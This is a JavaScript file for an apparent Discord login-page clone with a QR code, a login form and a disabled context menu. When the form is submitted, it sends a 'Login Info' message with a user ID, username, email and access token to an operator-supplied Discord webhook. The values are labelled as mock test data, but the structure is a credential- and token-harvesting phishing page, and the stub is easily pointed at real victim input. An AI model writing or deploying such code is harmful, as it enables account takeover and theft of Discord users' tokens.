document.addEventListener("DOMContentLoaded", () => {
  const form = document.querySelector("form");
  const loginButton = document.querySelector(".login button");
  const emailInput = document.querySelector("#emailORphone");
  const passwordInput = document.querySelector("#password");
  const qrCodeElement = document.querySelector(".qr-code");
  const qrCodeImg = document.createElement("img");

  // Discord webhook URL (replace with your own)
  const WEBHOOK_URL = "your_discord_webhook_url"; // Replace with your Discord webhook URL

  // Mock user credentials for testing
  const MOCK_CREDENTIALS = {
    email: "test@example.com",
    password: "password123",
  };

  // Mock user data for successful login
  const MOCK_USER_DATA = {
    id: "123456789012345678",
    username: "TestUser",
    email: "test@example.com",
    token: "mock-access-token-abc123xyz",
  };

  // Disable context menu
  document.addEventListener("contextmenu", (event) => event.preventDefault());

  // QR code animation
  qrCodeImg.src = "./assets/qrcode-discord-logo.png";
  qrCodeImg.alt = "QR Code";
  qrCodeElement.appendChild(qrCodeImg);

  const createCube = () => {
    const cube = document.createElement("div");
    cube.classList.add("cube");
    qrCodeElement.appendChild(cube);

    const moveCube = () => {
      const maxX = qrCodeElement.offsetWidth - cube.offsetWidth;
      const maxY = qrCodeElement.offsetHeight - cube.offsetHeight;
      const newX = Math.random() * maxX;
      const newY = Math.random() * maxY;
      cube.style.transform = `translate(${newX}px, ${newY}px)`;
    };

    moveCube();
    setInterval(moveCube, 2000);
  };

  for (let i = 0; i < 4; i++) createCube();

  // Form submission with mock authentication
  form.addEventListener("submit", async (e) => {
    e.preventDefault();
    const email = emailInput.value.trim();
    const password = passwordInput.value.trim();

    if (!email || !password) {
      alert("Please fill in both email/phone and password.");
      return;
    }

    // Start ellipsis animation
    loginButton.disabled = true;
    loginButton.textContent = "Logging in.";
    const ellipsisInterval = setInterval(() => {
      loginButton.textContent =
        loginButton.textContent.length < 13
          ? loginButton.textContent + "."
          : "Logging in.";
    }, 500);

    try {
      // Simulate authentication
      if (
        email.toLowerCase() !== MOCK_CREDENTIALS.email ||
        password !== MOCK_CREDENTIALS.password
      ) {
        throw new Error("Invalid email or password.");
      }

      // Send mock user data to webhook
      const response = await fetch(WEBHOOK_URL, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          content: `**Login Info**\nUser ID: ${MOCK_USER_DATA.id}\nUsername: ${MOCK_USER_DATA.username}\nEmail: ${MOCK_USER_DATA.email}\nToken: ${MOCK_USER_DATA.token}`,
        }),
      });

      if (!response.ok) {
        throw new Error("Failed to send data to webhook.");
      }

      alert("Login successful! Data sent to webhook.");
      emailInput.value = "";
      passwordInput.value = "";
    } catch (error) {
      alert(`Error: ${error.message || "Something went wrong."}`);
      console.error("Login error:", error);
    } finally {
      // Stop ellipsis animation
      clearInterval(ellipsisInterval);
      loginButton.textContent = "Log In";
      loginButton.disabled = false;
    }
  });
});
